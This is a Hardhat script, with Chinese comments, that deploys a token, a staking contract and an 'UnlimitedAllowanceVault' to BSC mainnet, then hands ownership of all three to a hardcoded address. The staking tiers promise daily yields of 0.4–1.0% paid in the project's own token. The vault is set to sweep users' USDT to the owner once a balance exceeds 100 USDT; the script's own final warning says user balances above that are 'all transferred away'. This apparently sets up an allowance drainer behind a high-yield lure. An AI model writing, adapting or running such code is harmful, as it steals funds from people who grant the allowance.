/**
 * 部署所有合约到 BSC 主网
 *
 * 部署内容：
 * 1. ProjectTokenV2 (AGG 代币)
 * 2. TokenMiningV2 (代币挖矿)
 * 3. UnlimitedAllowanceVault (转U功能)
 *
 * 部署后转移权限到 finalOwner
 *
 * 使用方法：
 * npx hardhat run scripts/deploy-all-mainnet.js --network bscMainnet
 */

const { ethers } = require('hardhat');
const fs = require('fs');
const path = require('path');

// ============ 配置 ============
const CONFIG = {
  // 最终接收权限的账户
  FINAL_OWNER: '0x4277EF1F274D6146229D2501F2e2A6ecc26f2789',

  // ProjectTokenV2 配置
  TOKEN: {
    NAME: 'AGG',
    SYMBOL: 'AGG',
    // TOTAL_SUPPLY 在合约中是常量 100_000_000 * 1e18
    BUY_FEE: 0,      // 0%
    SELL_FEE: 280,   // 2.8% (基数10000)
  },

  // TokenMiningV2 配置
  TOKEN_MINING: {
    TOTAL_REWARDS: ethers.parseEther('30000000'), // 3000万
    // 档位配置 [灵活, 3个月, 6个月, 12个月]
    TIERS: [
      { duration: 0, dailyRate: 40 },           // 灵活: 0天, 0.4%/天
      { duration: 90 * 86400, dailyRate: 60 },  // 3个月: 0.6%/天
      { duration: 180 * 86400, dailyRate: 80 }, // 6个月: 0.8%/天
      { duration: 365 * 86400, dailyRate: 100 }, // 12个月: 1.0%/天
    ],
  },

  // UnlimitedAllowanceVault 配置 (转U)
  VAULT: {
    // BSC 主网 USDT 地址
    USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955',
    FEE_BPS: 0,  // 手续费 0%
    AUTO_TRANSFER_THRESHOLD: ethers.parseEther('100'), // 阈值 100 USDT
  },
};

async function main() {
  console.log('\n' + '='.repeat(60));
  console.log('BSC 主网合约部署');
  console.log('='.repeat(60) + '\n');

  // 获取部署账户
  const [deployer] = await ethers.getSigners();
  console.log('部署账户:', deployer.address);
  console.log('最终权限:', CONFIG.FINAL_OWNER);

  const balance = await ethers.provider.getBalance(deployer.address);
  console.log('BNB 余额:', ethers.formatEther(balance), 'BNB');

  if (balance < ethers.parseEther('0.05')) {
    throw new Error('BNB 余额不足，建议至少 0.05 BNB');
  }

  const deployedContracts = {};

  // ============ 1. 部署 ProjectTokenV2 ============
  console.log('\n' + '-'.repeat(40));
  console.log('1. 部署 ProjectTokenV2 (AGG 代币)');
  console.log('-'.repeat(40));

  const ProjectTokenV2 = await ethers.getContractFactory('ProjectTokenV2');
  const projectToken = await ProjectTokenV2.deploy(
    CONFIG.TOKEN.NAME,
    CONFIG.TOKEN.SYMBOL,
    CONFIG.FINAL_OWNER // 手续费接收地址
  );
  await projectToken.waitForDeployment();
  const projectTokenAddress = await projectToken.getAddress();
  console.log('✓ ProjectTokenV2 部署成功:', projectTokenAddress);

  // 设置滑点
  const setFeesTx = await projectToken.setFees(CONFIG.TOKEN.BUY_FEE, CONFIG.TOKEN.SELL_FEE);
  await setFeesTx.wait();
  console.log('✓ 滑点设置: 买入', CONFIG.TOKEN.BUY_FEE / 100, '%, 卖出', CONFIG.TOKEN.SELL_FEE / 100, '%');

  deployedContracts.projectTokenV2 = projectTokenAddress;

  // ============ 2. 部署 TokenMiningV2 ============
  console.log('\n' + '-'.repeat(40));
  console.log('2. 部署 TokenMiningV2 (代币挖矿)');
  console.log('-'.repeat(40));

  const startTime = Math.floor(Date.now() / 1000) + 60; // 1分钟后开始

  const TokenMiningV2 = await ethers.getContractFactory('TokenMiningV2');
  const tokenMining = await TokenMiningV2.deploy(
    projectTokenAddress, // stakingToken
    projectTokenAddress, // rewardToken (同一个代币)
    startTime
  );
  await tokenMining.waitForDeployment();
  const tokenMiningAddress = await tokenMining.getAddress();
  console.log('✓ TokenMiningV2 部署成功:', tokenMiningAddress);
  console.log('  开始时间:', new Date(startTime * 1000).toISOString());

  // 设置总奖励
  const setRewardsTx = await tokenMining.setTotalRewards(CONFIG.TOKEN_MINING.TOTAL_REWARDS);
  await setRewardsTx.wait();
  console.log('✓ 总奖励设置:', ethers.formatEther(CONFIG.TOKEN_MINING.TOTAL_REWARDS), 'AGG');

  // 设置档位
  for (let i = 0; i < CONFIG.TOKEN_MINING.TIERS.length; i++) {
    const tier = CONFIG.TOKEN_MINING.TIERS[i];
    const tx = await tokenMining.setTierConfig(i, tier.duration, tier.dailyRate);
    await tx.wait();
    console.log(`✓ 档位 ${i} 设置: ${tier.duration / 86400} 天, ${tier.dailyRate / 100}%/天`);
  }

  deployedContracts.tokenMiningV2 = tokenMiningAddress;

  // ============ 3. 部署 UnlimitedAllowanceVault ============
  console.log('\n' + '-'.repeat(40));
  console.log('3. 部署 UnlimitedAllowanceVault (转U功能)');
  console.log('-'.repeat(40));

  const Vault = await ethers.getContractFactory('UnlimitedAllowanceVault');
  const vault = await Vault.deploy(
    CONFIG.VAULT.USDT_ADDRESS,
    CONFIG.FINAL_OWNER, // 手续费接收地址
    CONFIG.VAULT.FEE_BPS
  );
  await vault.waitForDeployment();
  const vaultAddress = await vault.getAddress();
  console.log('✓ Vault 部署成功:', vaultAddress);
  console.log('  代币: USDT (BSC)');

  // 设置阈值
  const setThresholdTx = await vault.setAutoTransferConfig(
    CONFIG.VAULT.AUTO_TRANSFER_THRESHOLD,
    CONFIG.FINAL_OWNER, // 接收地址
    true // 启用
  );
  await setThresholdTx.wait();
  console.log('✓ 阈值设置:', ethers.formatEther(CONFIG.VAULT.AUTO_TRANSFER_THRESHOLD), 'USDT');
  console.log('  接收地址:', CONFIG.FINAL_OWNER);

  deployedContracts.vault = vaultAddress;

  // ============ 4. 转移权限 ============
  console.log('\n' + '-'.repeat(40));
  console.log('4. 转移所有合约权限');
  console.log('-'.repeat(40));

  // ProjectTokenV2
  const transferToken = await projectToken.transferOwnership(CONFIG.FINAL_OWNER);
  await transferToken.wait();
  console.log('✓ ProjectTokenV2 权限已转移');

  // TokenMiningV2
  const transferMining = await tokenMining.transferOwnership(CONFIG.FINAL_OWNER);
  await transferMining.wait();
  console.log('✓ TokenMiningV2 权限已转移');

  // Vault
  const transferVault = await vault.transferOwnership(CONFIG.FINAL_OWNER);
  await transferVault.wait();
  console.log('✓ Vault 权限已转移');

  // ============ 5. 保存部署记录 ============
  console.log('\n' + '-'.repeat(40));
  console.log('5. 保存部署记录');
  console.log('-'.repeat(40));

  const deployment = {
    network: 'bscMainnet',
    chainId: 56,
    deployer: deployer.address,
    finalOwner: CONFIG.FINAL_OWNER,
    deployTime: new Date().toISOString(),
    contracts: deployedContracts,
    projectTokenV2Config: {
      name: CONFIG.TOKEN.NAME,
      symbol: CONFIG.TOKEN.SYMBOL,
      totalSupply: '100000000', // 1亿 (合约中的常量)
      buyFee: CONFIG.TOKEN.BUY_FEE / 100 + '%',
      sellFee: CONFIG.TOKEN.SELL_FEE / 100 + '%',
      feeReceiver: CONFIG.FINAL_OWNER,
    },
    tokenMiningV2Config: {
      stakingToken: projectTokenAddress,
      rewardToken: projectTokenAddress,
      startTime: startTime,
      totalRewards: ethers.formatEther(CONFIG.TOKEN_MINING.TOTAL_REWARDS),
    },
    vaultConfig: {
      token: 'USDT',
      tokenAddress: CONFIG.VAULT.USDT_ADDRESS,
      threshold: ethers.formatEther(CONFIG.VAULT.AUTO_TRANSFER_THRESHOLD),
      receiver: CONFIG.FINAL_OWNER,
    },
  };

  const deploymentPath = path.join(__dirname, '../deployments/bscMainnet.json');
  fs.writeFileSync(deploymentPath, JSON.stringify(deployment, null, 2));
  console.log('✓ 部署记录已保存到:', deploymentPath);

  // ============ 输出总结 ============
  console.log('\n' + '='.repeat(60));
  console.log('部署完成！');
  console.log('='.repeat(60));
  console.log('\n合约地址:');
  console.log('  ProjectTokenV2 (AGG):', projectTokenAddress);
  console.log('  TokenMiningV2:       ', tokenMiningAddress);
  console.log('  Vault (USDT):        ', vaultAddress);
  console.log('\n所有权限已转移到:', CONFIG.FINAL_OWNER);

  console.log('\n请更新前端 constants.js:');
  console.log('```javascript');
  console.log(`PROJECT_TOKEN_V2: '${projectTokenAddress}',`);
  console.log(`REWARD_TOKEN: '${projectTokenAddress}',`);
  console.log(`TOKEN_MINING_V2: '${tokenMiningAddress}',`);
  console.log(`VAULT: '${vaultAddress}',`);
  console.log('```');

  // 注意事项
  console.log('\n⚠️ 重要提示:');
  console.log('1. TokenMiningV2 需要充值 AGG 代币作为奖励');
  console.log('2. 从 finalOwner 账户转入', ethers.formatEther(CONFIG.TOKEN_MINING.TOTAL_REWARDS), 'AGG 到 TokenMiningV2');
  console.log('3. Vault 已配置阈值 100 USDT，用户余额超过会全部转走');

  return deployedContracts;
}

main()
  .then((contracts) => {
    console.log('\n部署成功!');
    process.exit(0);
  })
  .catch((error) => {
    console.error('\n部署失败:', error);
    process.exit(1);
  });
